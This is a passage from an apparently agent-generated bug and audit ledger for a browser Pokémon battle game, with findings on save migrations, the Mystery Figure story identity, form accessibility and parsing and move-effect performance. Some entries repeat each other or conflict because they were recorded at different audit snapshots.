            slot.id = 'm_' + Math.random().toString(36).slice(2, 10);
        }
    }
}
```
The v15 migration was authored when `sm.pcBox` didn't yet exist (PC was introduced in v15), so the gap is moot in practice. But v17 had to follow up specifically because the v15 ID-stamping didn't cover pcBox. Today, on a pre-v15 save: v15 stamps team IDs → v17 stamps pcBox IDs (newly-created by `migrateStoryPreV15`'s `if (!Array.isArray(sm.pcBox)) sm.pcBox = []` — so pcBox is empty array, no IDs to stamp). Safe.

**Repro**: Trace a fresh v15 → v17 → v19 migration of a pre-v15 save. pcBox is empty after v15, so no IDs are missed.

**Blast radius**: None — purely a consistency note for clarity.

**Fix sketch**: Either accept the historical sequencing (no action), or backport the v17 pattern into v15 for cleaner reading: `for (const arr of [sm.team, sm.pcBox]) { ... }`. Behavior unchanged either way.

**Verification**: Round-trip a pre-v15 save through the chain; PCs all have IDs.

---

## <a id="ISSUE-350"></a> ISSUE-350: Pre-v15 saves get 0 Poké Balls instead of the intended 5 — migrateStoryPreV15 balls default is shadowed by the default sm object

---
id: ISSUE-350
severity: P3
category: bug
anchor_symbol: migrateStoryPreV15
current_line_hint: ~32155
file: battle.html
agents: [story-mode-investigator]
fingerprint: 1839297b78a2
confidence: high
status: open
---

**Title**: Pre-v15 saves get 0 Poké Balls instead of the intended 5 — migrateStoryPreV15 balls default is shadowed by the default sm object

**Evidence**: `migrateStoryPreV15` (~32155) intends to seed old saves with a starting ball kit:
```js
if (!sm.balls || typeof sm.balls !== 'object') sm.balls = { poke: 5, great: 0, ultra: 0, master: 0 };
```
But the module-singleton `sm` is initialized with `balls: { poke: 0, great: 0, ultra: 0, master: 0 }` (~32242). `load()` does `Object.assign(sm, d)`; a pre-v15 save predates the catch system and has NO `balls` field, so `sm.balls` retains the default `{poke:0}` object. The migration's `if (!sm.balls...)` is therefore false and the `poke:5` branch never runs.

**Repro**: `node scripts/debug/_repro/balls-migration.mjs` → loads a `version:8` save with no `balls` field; result is `{poke:0,...}` not `{poke:5,...}`.

**Blast radius**: Narrow — only genuine pre-v15 saves (predating the v15 catch/PC/balls schema). They start the post-migration session unable to catch until they buy/earn balls. Recoverable, not a crash.

**Fix sketch**: In `migrateStoryPreV15`, explicitly seed `sm.balls.poke = Math.max(5, sm.balls.poke|0)` (or detect the pre-v15 marker — e.g. absence of `sm.catchUnlocked` in the raw save `d`) rather than relying on `!sm.balls`. The same default-shadowing pattern affects any migration that uses `if (!sm.X)` for a field the default `sm` already initializes.

**Verification**: Re-run the repro; `sm.balls.poke` should be 5 after migrating a pre-v15 save.

---

## <a id="ISSUE-351"></a> ISSUE-351: Catch-tutorial migration hard-codes intro-rival index (>1) instead of deriving it

---
id: ISSUE-351
severity: P3
category: inconsistency
anchor_symbol: migrateStoryPreV16
current_line_hint: ~34629
file: battle.html
agents: [story-mode-investigator]
fingerprint: 310b762487af
confidence: low
status: open
---

**Title**: Catch-tutorial migration hard-codes intro-rival index (>1) instead of deriving it

**Evidence**:
```js
function migrateStoryPreV16() {
    if (typeof sm.catchTutorialDone !== 'boolean') {
        sm.catchTutorialDone = (sm.eventIndex | 0) > 1;   // magic 1 = intro-rival array index
    }
}
```

**Repro**: The runtime gate `_shouldFireCatchTutorialBeforeBattle` derives the intro-rival position dynamically (`introIdx = STORY_EVENTS_RAW.findIndex(... row[0]===STORY_RIVAL_ROW_INTRO)`, currently index 1) and skips when `eventIndex <= introIdx`. The migration instead hard-codes `> 1`. Today they agree (intro rival is `STORY_EVENTS_RAW[1]`), but the magic literal duplicates a value owned by the timeline; if a future timeline edit shifts the intro rival's array position, a migrating save could get `catchTutorialDone` mis-set (re-firing or skipping the tutorial).

**Blast radius**: Pre-v16 save round-trips only; cosmetic tutorial re-fire/skip. Save-schema territory (pasteur) — flag, don't edit.

**Fix sketch**: Derive the cutoff the same way the runtime gate does (`introIdx` via findIndex) rather than the literal `1`.

**Verification**: save-migration.test.js: round-trip a pre-v16 save sitting exactly at the rival row; assert `catchTutorialDone` matches the runtime gate's expectation.

---

## <a id="ISSUE-352"></a> ISSUE-352: catchTutorialDone migration hardcodes eventIndex>1 instead of deriving the intro-rival row

---
id: ISSUE-352
severity: P3
category: dx
anchor_symbol: migrateStoryPreV16
current_line_hint: ~34628
file: battle.html
agents: [story-mode-investigator]
fingerprint: 0f033b3c2f01
confidence: medium
status: open
---

**Title**: catchTutorialDone migration hardcodes eventIndex>1 instead of deriving the intro-rival row

**Evidence**:
```js
function migrateStoryPreV16() {
    if (typeof sm.catchTutorialDone !== 'boolean') {
        sm.catchTutorialDone = (sm.eventIndex | 0) > 1; // magic '1'
    }
}
```

**Repro**: Round-trips fine today (intro rival sits at row index ~1), but the runtime gate _shouldFireCatchTutorialBeforeBattle derives introIdx dynamically via STORY_RIVAL_ROW_INTRO. If the timeline ever shifts the intro rival's array index, the migration would mis-mark old saves (tutorial fires mid-run or is wrongly suppressed).

**Blast radius**: Save migration fragility tied to timeline ordering (pasteur-owned). Latent, not currently breaking.

**Fix sketch**: Derive the threshold from STORY_EVENTS_RAW.findIndex(intro-rival) like the runtime gate does, instead of the literal 1.

**Verification**: Shift STORY_RIVAL_ROW_INTRO row position in a test fixture; confirm migration still marks pre-tutorial saves correctly.

---

## <a id="ISSUE-353"></a> ISSUE-353: catchTutorialDone migration hard-codes `eventIndex > 1` instead of deriving the intro-rival array index

---
id: ISSUE-353
severity: P3
category: dx
anchor_symbol: migrateStoryPreV16
current_line_hint: ~35291
file: battle.html
agents: [story-mode-investigator]
fingerprint: bb39f6bc2e99
confidence: medium
status: open
---

**Title**: catchTutorialDone migration hard-codes `eventIndex > 1` instead of deriving the intro-rival array index

**Evidence**:
```js
function migrateStoryPreV16() {
    if (typeof sm.catchTutorialDone !== 'boolean') {
        sm.catchTutorialDone = (sm.eventIndex | 0) > 1;   // magic "1"
    }
}
```

**Repro**: The intro rival is at array idx 1 (verified in harness), so `> 1` is correct *today*. But `_shouldFireCatchTutorialBeforeBattle` derives the same boundary dynamically (`STORY_EVENTS_RAW.findIndex(... rowId===STORY_RIVAL_ROW_INTRO)`). The migration uses a literal; a timeline shift would desync them. Confirms ISSUE-292/293.

**Blast radius**: Latent. Any future insertion of a row before the intro rival shifts its array index past 1 and the v16 migration would wrongly mark `catchTutorialDone` for saves parked at the new pre-rival rows (or skip it). Only fires for `_loadedVer < 16` saves, so the live blast radius shrinks over time.

**Fix sketch**: Derive the boundary in the migration the same way the gate does: `const introIdx = STORY_EVENTS_RAW.findIndex(r => r && r[1]==='Battle' && (r[0]|0)===STORY_RIVAL_ROW_INTRO); sm.catchTutorialDone = (sm.eventIndex|0) > introIdx;`

**Verification**: Migration boundary matches `_shouldFireCatchTutorialBeforeBattle`'s computed introIdx.

---

## <a id="ISSUE-354"></a> ISSUE-354: Online Host/Join form labels are not programmatically associated with their inputs

---
id: ISSUE-354
severity: P3
category: a11y
anchor_symbol: modal-online-host
current_line_hint: ~7637
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: bdcd17777e9c
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Online Host/Join form labels are not programmatically associated with their inputs

**Evidence**:
```html
<!-- modal-online-host at ~7637 -->
<label style="display:block;font-size:12px;margin:10px 0 4px;">Your display name</label>
<input id="online-host-name" maxlength="24" placeholder="Host" style="…">

<!-- modal-online-pvp at ~7673 -->
<label style="display:block;font-size:12px;margin:8px 0 4px;">Your name (leaderboard)</label>
<input id="online-join-name" maxlength="24" placeholder="Trainer" style="…">
<label style="display:block;font-size:12px;margin:10px 0 4px;">Room code</label>
<input id="online-join-code" maxlength="8" style="…">
```

The `<label>` elements are visually adjacent to the inputs but missing `for="online-host-name"`/etc., and the inputs lack `aria-labelledby`/`aria-label`. SR users hear "edit text" with no name; clicking the label does not focus the input. Contrast with the trainer-create form at ~8370 which uses the wrapping-`<label>` pattern correctly.

**Repro**: Open Online → Host with VoiceOver → Tab to first text field → announced as "edit text" with no name.

**Blast radius**: Two modals, three inputs. Small surface but trivial to fix and a common heuristic that linting catches.

**Fix sketch**: Either add `for="online-host-name"` (etc.) on the labels, or wrap each label/input pair into a single `<label>` element following the pattern used in `screen-story-trainercreate`.

**Verification**: SR announces "Your display name, edit text" on focus; clicking the label focuses the input.

---

## <a id="ISSUE-355"></a> ISSUE-355: STORY_MODE_FLOW §14d describes Mystery Figure's 7-identity flow + Caged God repurpose; code has only the_first

---
id: ISSUE-355
severity: P3
category: inconsistency
anchor_symbol: MYSTERY_FIGURE_IDENTITIES
current_line_hint: ~33100
file: STORY_MODE_FLOW.md
agents: [spec-drift-auditor]
fingerprint: 69883614a0e7
confidence: high
status: open
---

**Title**: STORY_MODE_FLOW §14d describes Mystery Figure's 7-identity flow + Caged God repurpose; code has only the_first

**Evidence**:
```text
STORY_MODE_FLOW.md §14d (~505-508):
  "Post-HoF Mystery Figure battle (row 67 ...) — final masked challenger, repurposed for the Caged God arc."
  context describes _profMysteryMode / multi-identity rotation.
battle.html:33100  const MYSTERY_FIGURE_IDENTITIES = { the_first: {...} };   // single entry
battle.html:33125  return MYSTERY_FIGURE_IDENTITIES.the_first;                 // _storyEnsureMysteryIdentity
```

**Repro**: `grep -n "the_first\|cyrus\|ghetsis" battle.html` near 33100 — the identity table collapsed to a single `the_first` (per STORY_3TRACK_IMPL_PLAN Decision 5 / PR-6; ledger ISSUE-308). STORY_MODE_FLOW §14d still frames Mystery Figure as a rotating multi-identity flow "repurposed for the Caged God arc" — both the 7-identity rotation and the Caged-God repurpose are gone.

**Blast radius**: Doc-only, but §14d is part of the file CLAUDE.md names as story canon, so it actively misdescribes the post-HoF climax (single "The First" identity, no Caged God). Compounds finding 2499e3087f11.

**Fix sketch**: Rewrite §14d: Mystery Figure is a single locked identity "The First" (battle.html:33101, sprite Red); drop the "repurposed for the Caged God arc" clause; keep the Professor-vs-Mystery split that is still accurate.

**Verification**: §14d names "The First" as the sole identity and references no Caged God; matches battle.html:33100-33125.

---

## <a id="ISSUE-356"></a> ISSUE-356: CONFIRMED FIXED — Mystery Figure is now a rotating 10-identity cast (prior audit: hardcoded Cyrus)

---
id: ISSUE-356
severity: P3
category: inconsistency
anchor_symbol: MYSTERY_FIGURE_IDENTITIES
current_line_hint: ~29759
file: battle.html
agents: [story-mode-investigator]
fingerprint: 91bb9bebbb7a
confidence: high
status: open
---

**Title**: CONFIRMED FIXED — Mystery Figure is now a rotating 10-identity cast (prior audit: hardcoded Cyrus)

**Evidence**:
```js
const MYSTERY_FIGURE_IDENTITIES = {
    cyrus:{...}, ghetsis:{...}, cynthia:{...}, steven:{...}, n:{...},
    red:{...}, lance:{...}, buried_alive:{...}, cartridge_self:{...}
};
function _storyEnsureMysteryIdentity() { if (!sm.mysteryIdentity || ...) sm.mysteryIdentity = _storyPickMysteryIdentity(); ... }
```

**Repro**: Prior audit flagged the Mystery Figure sprite as "unconditionally Cyrus". Now `sm.mysteryIdentity` is rolled once per run (`_storyPickMysteryIdentity`, 29807) from 10 identities, each with per-identity intro lines + outro. The city-hub tease (38613) and the post-HoF boss both read the same pinned identity. Two are storyline-exclusive (`buried_alive`, `cartridge_self`) with `mysteryBias` weighting. Tier-2 #8 resolved.

**Blast radius**: Fanservice — resolved. Minor residual: the fallback at 38614 is still `'Cyrus'` if `sm.mysteryIdentity` is somehow unset at render time, but `_storyEnsureMysteryIdentity` makes that path effectively dead.

**Fix sketch**: None required. Optionally drop the literal `'Cyrus'` fallback in favor of `_storyEnsureMysteryIdentity().sprite` for consistency.

**Verification**: Start two runs; confirm different pinned mystery identities and matching intro/outro voice.

---

## <a id="ISSUE-357"></a> ISSUE-357: `mysteryBias` per-variant config is orphaned — seeds weights for retired MF identities, never read

---
id: ISSUE-357
severity: P3
category: data
anchor_symbol: MYSTERY_FIGURE_IDENTITIES
current_line_hint: ~40667
file: battle.html
agents: [story-mode-investigator]
fingerprint: e46f43a0e592
confidence: high
status: open
---

**Title**: `mysteryBias` per-variant config is orphaned — seeds weights for retired MF identities, never read

**Evidence**:
```js
mysteryBias: { cyrus: 3, ghetsis: 1, lance: 1, red: 1 },   // bone_keepers
mysteryBias: { buried_alive: 8, cyrus: 1, ghetsis: 1 },     // lavender_frequency
mysteryBias: { cartridge_self: 10 },                        // static
```
Defined in 8 variant entries (`~40667`–`~40838`). Grep for any READ of `.mysteryBias` / `mysteryBias` outside these definitions returns nothing. `_storyPickMysteryIdentity()` hardcodes `'the_first'`, so the weighting these fields were meant to drive is bypassed entirely.

**Repro**: `grep -nE "\.mysteryBias" battle.html` → only definition sites; no consumer.

**Blast radius**: Dead config data. Harmless at runtime but misleading — implies a per-variant MF identity weighting still exists. References species/identity keys that no longer have `MYSTERY_FIGURE_IDENTITIES` entries.

**Fix sketch**: Remove the `mysteryBias` field from all variant definitions (pasteur-owned data). Or, if per-variant MF identity is desired again, wire a real consumer.

**Verification**: grep shows zero `mysteryBias` references post-removal; variant table still parses.

---

## <a id="ISSUE-358"></a> ISSUE-358: Mystery Figure rotating-cast scaffolding is now vestigial — collapsed to a single hard-locked identity "the_first"

---
id: ISSUE-358
severity: P3
category: refactor
anchor_symbol: MYSTERY_FIGURE_IDENTITIES
current_line_hint: ~33146
file: battle.html
agents: [story-mode-investigator]
fingerprint: 5cb29622c552
confidence: high
status: open
---

**Title**: Mystery Figure rotating-cast scaffolding is now vestigial — collapsed to a single hard-locked identity "the_first"

**Evidence**:
```js
const MYSTERY_FIGURE_IDENTITIES = { the_first: { sprite:'Red', ... } }; // 1 entry
function _storyPickMysteryIdentity() { return 'the_first'; }           // always
function _storyEnsureMysteryIdentity() { if (sm.mysteryIdentity !== 'the_first') sm.mysteryIdentity = 'the_first'; ... }
```

**Repro**: Both functions are constant. The `sm.mysteryIdentity` save field, the picker, the rotation machinery, and the `'Cyrus'` fallback at `@43548` are all dead state around a single value.

**Blast radius**: Design churn. The v22 3-track collapse intentionally retired the 10-identity rotation (ISSUE-169 "Cyrus hardcode" and ISSUE-295 "rotating cast fixed" are now BOTH moot — there's deliberately one identity). No bug, but the leftover plumbing (per-run `mysteryIdentity` field, `_storyPickMysteryIdentity`, the `MYSTERY_FIGURE_IDENTITIES[sm.mysteryIdentity]` indirection) implies a rotation that no longer exists and will mislead the next reader. Flagging as the "one discovery per surprise."

**Fix sketch**: Either inline `the_first` and drop `sm.mysteryIdentity`/the picker, or (if a future rotation is planned) leave a one-line comment that the single-entry map is intentional and rotation is deferred. Currently neither is signposted at the call sites.

**Verification**: Reading the city-hub Mystery sprite path makes the single-identity intent obvious.

---

## <a id="ISSUE-359"></a> ISSUE-359: Fresh runs start with 0 Poké Balls; spec §1/§10 say 5 (only migrated saves get 5)

---
id: ISSUE-359
severity: P3
category: inconsistency
anchor_symbol: newStoryRun
current_line_hint: ~39514
file: battle.html
agents: [story-mode-investigator]
fingerprint: 62820f39b02f
confidence: high
status: open
---

**Title**: Fresh runs start with 0 Poké Balls; spec §1/§10 say 5 (only migrated saves get 5)

**Evidence**:
```js
balls: { poke: 0, great: 0, ultra: 0, master: 0 },   // fresh-run init @39514
// vs migrateStoryPreV15 @35260: sm.balls = { poke: 5, ... } (migrated saves only)
// vs spec §10 sm-defaults: balls: { poke: 5, ... }
```

**Repro**: Harness fresh `StoryMode.state.balls` ⇒ `{poke:0,...}`. v14-save round-trip ⇒ `{poke:5,...}`. Asymmetry between fresh and migrated.

**Blast radius**: Cosmetic/spec-drift today because the mandatory first-Mart grant covers it (see prior finding). Extends ISSUE-291 (which only covered the migration side) to the fresh-run side. The two ball-init paths disagree with each other and with the spec.

**Fix sketch**: If the design intent is "balls come from the Mart, not the kit" (which the firstMart scene implies), update spec §1/§10 and the v15 migration to `poke:0` for consistency. If the intent is "kit has 5", set fresh-run init to `poke:5`. Pick one.

**Verification**: Fresh and migrated `sm.balls.poke` agree, and match the spec.

---

## <a id="ISSUE-360"></a> ISSUE-360: A cluster of form controls lack accessible names (online host/join, casino bet, gauntlet opt-in)

---
id: ISSUE-360
severity: P3
category: a11y
anchor_symbol: online-host-format
current_line_hint: ~8113
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: 8407ee14cfc4
confidence: medium
status: open
---

**Title**: A cluster of form controls lack accessible names (online host/join, casino bet, gauntlet opt-in)

**Evidence**:
```html
<select id="online-host-format" ...>           <!-- no label / aria-label -->
<input id="online-join-code" maxlength="8" ...> <!-- no label, no placeholder -->
<input id="story-casino-flip-bet" type="number" value="50"> <!-- no label -->
```

**Repro**: SR announces these as unlabeled "edit text" / "combo box". Affects online host format/timer selects (L8113/8119), join name/code inputs (L8146/8148), casino flip/roulette bet inputs (L8640/8701), gauntlet leaderboard opt-in (L8212). Note: Settings rows (L7996+), trainer-create name (L8919) and gen/mech checkboxes are correctly labeled — this is a contained cluster, mostly in the online/casino surfaces.

**Blast radius**: Online lobby, casino mini-games, gauntlet leaderboard. Low story-mode-core impact but trivial to fix.

**Fix sketch**: Add `aria-label` (or wrap/associate a visible `<label for=…>`) on each listed control. Mirror the already-correct pattern used in `#modal-settings`.

**Verification**: SR speaks a meaningful name for every input/select on these screens.

---

## <a id="ISSUE-361"></a> ISSUE-361: `parseCSV` of `data/builds.csv` (2.6 MB, 17,397 rows) blocks the main thread for **180 ms median** during boot

---
id: ISSUE-361
severity: P3
category: perf
anchor_symbol: parseCSV
current_line_hint: ~9695
file: battle.html
agents: [performance-profiler]
fingerprint: 94ecaa3ab57f
confidence: high
status: open
---

**Title**: `parseCSV` of `data/builds.csv` (2.6 MB, 17,397 rows) blocks the main thread for **180 ms median** during boot

**Evidence**:
```js
// battle.html:9695 — char-at-a-time scan, no streaming, runs synchronously
function parseCSV(text, delim) {
    const norm = String(text || '').replace(/\r\n/g, '\n').replace(/\r/g, '\n');
    ...
    let lines = norm.trim().split('\n'), headers = parseCSVLine(lines[0], delim), rows = [];
    for (let i = 1; i < lines.length; i++) { ...; let vals = parseCSVLine(lines[i], delim); ...; rows.push(obj); }
    return rows;
}
function parseCSVLine(line, delim) {
    // single-char loop with mutation of `current` per char
    for (let i = 0; i < line.length; i++) { ... }
}
```

**Repro**: Re-parsed the live `data/builds.csv` (2,623 KB, 17,399 lines) 5× via `window.parseCSV` after boot: **trials 173 / 192 / 262 / 285 / 152 ms — median 192 ms, max 285 ms** for 17,397 rows. JSON.parse of *all five* JSON tables combined is 25 ms; CSV alone is **7× slower than the entire JSON pipeline**. (`/tmp/deep-perf4.mjs`, 2026-05-28.)

**Blast radius**: `loadBuildsCSV` is awaited in the boot critical path (battle.html:10143) before "Initializing engine (4/4)" appears. On a real browser, 180 ms is a single dropped frame at 60 Hz; on a mobile device the parse can easily blow past 300 ms and is one of the bigger contributors to the post-splash hang. The mandate item *"is the parse blocking the main thread? Could it stream?"* — yes, it blocks, and yes, it could either run off-main (Web Worker), be parsed lazily on first draft, or be pre-encoded as JSON during build (saves the per-char parser entirely).

**Fix sketch**: Three options, in cost order. (1) Cheapest: replace the per-char `parseCSVLine` with `split(',')` for the 95% of rows that contain no embedded commas + a quote-aware fallback for the few that do — measure expected ~3-5× speedup. (2) Move `loadBuildsCSV` out of the boot path; only the in-battle build resolver needs it, splash + main menu do not. (3) Pre-encode the CSV as `data/builds.json` during the existing `scripts/build-sprite-manifest.mjs`-style build step; `JSON.parse` is ~7× faster and is implemented in C++ in V8.

**Verification**: Re-time `loadBuildsCSV()` standalone; with option (2) the eager boot drops by ~180 ms and the deferred load happens during draft animation slack. With option (3), the same blob loads in ~25 ms. Confirm with `node --expose-gc scripts/debug/perf-bench.mjs` and the median boot ms.

---

## <a id="ISSUE-362"></a> ISSUE-362: `parseMoveEffects` per-move latency varies by ~315× between fastest and slowest moves; outliers are 25–250× the median

---
id: ISSUE-362
severity: P3
category: perf
anchor_symbol: parseMoveEffects
current_line_hint: 24269
file: battle.html
agents: [performance-profiler]
fingerprint: 4cae7cf40971
confidence: high
status: open
---

**Title**: `parseMoveEffects` per-move latency varies by ~315× between fastest and slowest moves; outliers are 25–250× the median

**Evidence**: drill-down via `scripts/debug/_repro/parse-move-drill.mjs` (boots harness, calls `parseMoveEffects(attacker, defender, move, true)` for all 950 moves with valid mons):
```
Total moves measured: 950
Median (all):          0.014 ms
Median (damaging):     0.014 ms  N=679
Median (status):       0.014 ms  N=271
Median (has secondary):0.017 ms  N=203
Median (no secondary): 0.013 ms  N=747

Top 10 slowest:
  3.463 ms  Status  secondary=false  Clangorous Soul
  3.396 ms  Status  secondary=false  Acid Armor
  3.381 ms  Status  secondary=false  Baby-Doll Eyes
  2.819 ms  Special secondary=true   Night Daze
  2.557 ms  Special secondary=false  10,000,000 Volt Thunderbolt
  2.128 ms  Special secondary=false  Incinerate
  1.963 ms  Status  secondary=false  Calm Mind
  1.851 ms  Status  secondary=false  Extreme Evoboost
  1.824 ms  Status  secondary=false  Bulk Up
  1.808 ms  Status  secondary=false  Shell Smash

Bottom 5 fastest: ~0.011 ms
```
Fastest:slowest ratio ≈ 0.011 → 3.46 = **315×**. The mandate's threshold is >10× variance → P3 finding.

**Repro**: `node scripts/debug/_repro/parse-move-drill.mjs` (script is in the gitignored `_repro/` folder; reproducible from the snippet documented here).

**Blast radius**: At normal sub-millisecond times these spikes are invisible. But (a) Clangorous Soul, Calm Mind, Bulk Up, Shell Smash, Acid Armor are setup moves used heavily in trainer sets, and they all involve **multi-stat boost loops** with logMsg/updateUI sequences — those are the slowest. (b) JSDOM happens to evaluate updateUI's DOM mutations cheaply; in a real browser those same moves will pay real layout/paint cost, so the relative spike could grow. (c) The top three are all `Status` moves with no secondary, suggesting the slow path is the boost-stage loop, not the secondary-effect branch. Status moves are NOT slower than damaging moves on the median — only the multi-stat-boost subset is.

**Fix sketch**: Profile Clangorous Soul (boosts ATK/DEF/SPA/SPD/SPE by +1, costs 33% HP) — that's 5 sequential `changeStage` calls + the HP cut + a logMsg. If the cost is dominated by `updateUI` being called inside `changeStage`, batch the UI update once at the end. If the cost is `logMsg` overhead per stage, that suggests the per-message channel switching path is the hot spot. Not urgent — even the worst move is 3.5 ms, well under any human-perceptible threshold in jsdom.

**Verification**: Re-run the drill script after any optimization. The expectation is the slowest moves drop into the sub-millisecond range and the variance ratio falls below 20×.

---

## <a id="ISSUE-363"></a> ISSUE-363: `parseMoveEffects` per-move latency varies ~257× (median 0.012 ms, slowest 3.19 ms) — multi-stat-boost / "dance" moves are the outliers

---
id: ISSUE-363
severity: P3
category: perf
anchor_symbol: parseMoveEffects
current_line_hint: 25255
file: battle.html
agents: [performance-profiler]
fingerprint: 45d50d234dfb
confidence: high
status: open
---

**Title**: `parseMoveEffects` per-move latency varies ~257× (median 0.012 ms, slowest 3.19 ms) — multi-stat-boost / "dance" moves are the outliers

**Evidence**: 954 distinct moves, valid attacker (Pikachu) + defender (Snorlax), `await engine.parseMoveEffects(atk, def, move, true)`:
```
median = 0.0124 ms   iqr = 0.0063   max = 3.190 ms   (n=954)
slowest: 3.19 Feather Dance | 1.53 Clangorous Soul | 1.50 Coaching | 1.47 Extreme Evoboost
         1.47 Decorate | 1.46 Calm Mind | 1.45 Coil | 1.44 Shell Smash
fastest: ~0.010 ms  (Harden, Sharpen, Hidden Power Water)
variance ratio (slowest / median) ≈ 257×
```
The mandate's >10× variance threshold is exceeded. Every outlier is a stat-stage move that runs a multi-stat boost loop with per-stage logMsg/UI sequencing.

**Repro**: drive `engine.parseMoveEffects(atk, def, movesDB[name], true)` for every move and sort by time. Median is ~40× under the 0.5 ms target; only the boost-loop subset spikes.

**Blast radius**: At sub-millisecond medians the spikes are invisible in jsdom, but Calm Mind / Bulk Up / Shell Smash / Clangorous Soul are heavily used in trainer setup sets, and in a real browser the per-stage UI work pays layout/paint cost the harness doesn't model — so the relative spike could grow on-device. Not user-perceptible today (worst case 3.2 ms).

**Fix sketch**: For multi-stat-boost moves, batch the UI/log update once after all stages resolve instead of per-stage (`changeStage` appears to drive a logMsg/updateUI per stat). Profile Feather Dance / Clangorous Soul specifically.

**Verification**: Re-run the per-move sort; expect the slow moves to drop sub-millisecond and the variance ratio below ~20×.

---

## <a id="ISSUE-364"></a> ISSUE-364: `parseMoveEffects` re-allocates 19 constant `Set` literals on every call and pays a 2–14 ms one-time JIT cost on first touch of each branch (warm cost is fine at ~0.01 ms)

---
id: ISSUE-364
severity: P3
category: perf
anchor_symbol: parseMoveEffects
current_line_hint: ~25463
file: battle.html
agents: [performance-profiler]
fingerprint: ba0eda6f97e7
confidence: high
status: open
---

**Title**: `parseMoveEffects` re-allocates 19 constant `Set` literals on every call and pays a 2–14 ms one-time JIT cost on first touch of each branch (warm cost is fine at ~0.01 ms)

**Evidence**:
```js
// battle.html:25463, 25471, 25481, 25482 … — 19 `new Set([...])` literals rebuilt PER CALL inside the
// async parseMoveEffects body (a ~1100-line function), e.g.:
const powderMoves = new Set(["Sleep Powder","Spore","Stun Spore","Poison Powder",...]);
const _selfTargetMoves = new Set(["Swords Dance","Nasty Plot","Calm Mind", /* ~60 names */ ]);
```
Measured (954 moves, valid attacker/defender): **warm median 0.0147 ms/call, max-after-warmup ~0.01 ms — every move is fast once JIT-compiled.** The apparent "variance" is purely cold-path: the FIRST touch of the stat-boost / multi-branch path costs Shell Smash 14.2 ms, Decorate/Coaching ~2.3 ms, then drops to ~0.01 ms on repeat (`/tmp/coldpath.mjs`, `/tmp/setalloc.mjs` this session). This corrects the prior "257× per-call variance" read — it is JIT warmup of a megamorphic function, not a pathological per-call algorithm.

**Repro**: `engine.parseMoveEffects(atk, def, movesDB[name], true)` — measure first call vs. repeated calls per move; first-touch of stat-boost moves spikes, warm calls are flat.

**Blast radius**: Not user-perceptible today (warm ~0.01 ms ≪ 0.5 ms target; first-touch spikes are one-time and hidden behind boot/first-turn). The concern is forward-looking: 19 fresh `Set` allocations per call is avoidable GC churn that grows as more named-move handlers are added, and a 1100-line megamorphic async function is a deopt risk the redesign will amplify.

**Fix sketch**: Hoist the 19 constant `Set` literals to module scope (build once) instead of re-allocating per call. Optionally split the named-move handlers into a lookup table so the function is not one megamorphic body — this reduces both the cold-path JIT cost and per-call allocation.

**Verification**: After hoisting the Sets, confirm warm per-call time is unchanged (~0.01 ms) and that a heap-allocation profile shows zero `Set` allocations inside `parseMoveEffects` per call.

---

## <a id="ISSUE-365"></a> ISSUE-365: parseMoveEffects per-move spread is 130x (stat-stage moves ~1.3ms vs 0.01ms median) — benign, multiple changeStage calls

---
id: ISSUE-365
severity: P3
category: perf
anchor_symbol: parseMoveEffects
current_line_hint: ~26886
file: battle.html
agents: [performance-profiler]
fingerprint: f9d620301a1e
confidence: high
status: open
---

**Title**: parseMoveEffects per-move spread is 130x (stat-stage moves ~1.3ms vs 0.01ms median) — benign, multiple changeStage calls

**Evidence**:
```js
// Slowest moves are multi-stat setup moves; each changeStage() logs + recomputes.
if (move.name === "Shell Smash") { changeStage(attacker,'atk',2); changeStage(attacker,'spa',2); changeStage(attacker,'spe',2); changeStage(attacker,'def',-1); changeStage(attacker,'spd',-1); return; }
if (move.name === "Quiver Dance") { changeStage(attacker,'spa',1); changeStage(attacker,'spd',1); changeStage(attacker,'spe',1); return; }
// vs a damage move that early-returns before this block: ~0.008ms.
```

**Repro**: `node /tmp/perf-ext.mjs` — per-move median-of-5 across 954 moves: **median 0.0099ms**, slowest = Shell Smash **1.32ms**, then Coaching 1.26ms, Decorate 1.14ms, Acid Armor 0.86ms, Agility 0.80ms. variance slowest/median = **~133x** (mandate flags >10x as P3). Note: the median (0.01ms) is FAR under the 0.5ms-per-call target; the absolute outlier of 1.3ms slightly exceeds 0.5ms but includes the harness's `logMsg` capture overhead, and these moves are rare per turn (one setup move occasionally), so net engine impact is negligible.

**Blast radius**: None practical — turn loop median is 9.4ms with these moves in the mix. This is informational variance, not a pathological lookup.

**Fix sketch**: No action required for performance. If desired for tidiness, the long `if (move.name === ...)` stat-boost ladder (~40 string compares) could be replaced by a data table `STAT_BOOST_MOVES[name] = {atk:2,...}`, which also collapses the per-call branch cost — but this is a refactor/data-driven nicety, not a perf necessity.

**Verification**: A data-table dispatch would flatten the spread toward the median; bench would show slowest move dropping under ~0.1ms.

---

## <a id="ISSUE-366"></a> ISSUE-366: Burn applied as final-damage multiplier (`modifier *= 0.5`) instead of halving the attack stat pre-floor

---
id: ISSUE-366
severity: P3
category: inconsistency
anchor_symbol: parseMoveEffects-burn-modifier
current_line_hint: ~21827
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 67e4da6efcae
confidence: medium
status: wontfix-corner-case-common-path-matches-showdown-by-the-hp
---

**Title**: Burn applied as final-damage multiplier (`modifier *= 0.5`) instead of halving the attack stat pre-floor

**Evidence**:
```js
// battle.html:21827
if (attacker.status === "BRN" && move.cat === "Physical" && attacker.ability !== "Guts") modifier *= 0.5;
```

Showdown halves the *attack stat* before the damage formula's `floor()`. The engine instead halves the final modifier. Common-case empirical check (Tackle 34 → 17 = 0.500) matches Showdown to the HP, but corner cases (very low attack stats, certain ability + screen interactions) can deviate by ±1 HP.

**Repro**: Construct a scenario where `floor(atk/2) * other` differs from `floor((atk*other) * 0.5)` — e.g., attacker with very low atk (~10) and a fractional `other` multiplier from screens.

**Blast radius**: Low. May matter for OHKO calcs against bulky walls. Range-assertion tests pass; point-comparison tests against `@smogon/calc` could surface a delta.

**Fix sketch**: Either rewrite as `A *= 0.5` near attack-stat computation (~21260 region), OR document the deviation in `tests/reports/deviations.md`.

**Verification**: Add a focused test: low-atk burned attacker vs screened defender; damage matches Showdown's `@smogon/calc` to the HP.

---

## <a id="ISSUE-367"></a> ISSUE-367: Stat-change status moves (Decorate, Coaching, Baby-Doll Eyes, Calm Mind) are 50–100× slower than damage moves — `changeStage` calls `logMsg` 1–3× per stat tick, each hitting the 903-key tooltipDict scan

---
id: ISSUE-367
severity: P3
category: perf
